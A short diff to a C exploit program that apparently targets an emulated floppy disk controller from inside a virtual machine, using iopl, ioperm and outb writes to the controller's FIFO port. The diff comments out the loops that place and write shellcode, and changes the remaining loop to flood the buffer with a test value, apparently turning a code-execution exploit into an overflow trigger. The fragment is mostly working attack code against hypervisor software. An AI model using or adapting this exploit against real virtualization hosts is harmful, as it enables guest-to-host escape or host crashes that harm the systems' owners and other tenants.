@@ -26,18 +26,18 @@ int main(void){
         iopl(3);
         ioperm(FIFO, 1, 1);
         outb(SPC_COMMAND, FIFO);
-        int i,j;
-        j = BH_COUNT-SH_POSITION-len_of_command-NUM_STRUCT*STRUCT_LEN;
-        //find a position to write shell code
-        for(i=0; i<SH_POSITION; i++ ){
-            outb(TEST_VAL,0x3f5);
-        }
-        //write shell code
-        for(i=0;i<SH_COUNT; i++){
-            outb(code[i], FIFO);
-        }
+        // int i,j;
+        // j = BH_COUNT-SH_POSITION-len_of_command-NUM_STRUCT*STRUCT_LEN;
+        // //find a position to write shell code
+        // for(i=0; i<SH_POSITION; i++ ){
+        //     outb(TEST_VAL,0x3f5);
+        // }
+        // //write shell code
+        // for(i=0;i<SH_COUNT; i++){
+        //     outb(code[i], FIFO);
+        // }
         // go to bh struct
-        for(i=0; i<j; i++){
+        for(i=0; i<BH_COUNT; i++){
             outb(TEST_VAL, FIFO);
         }
         
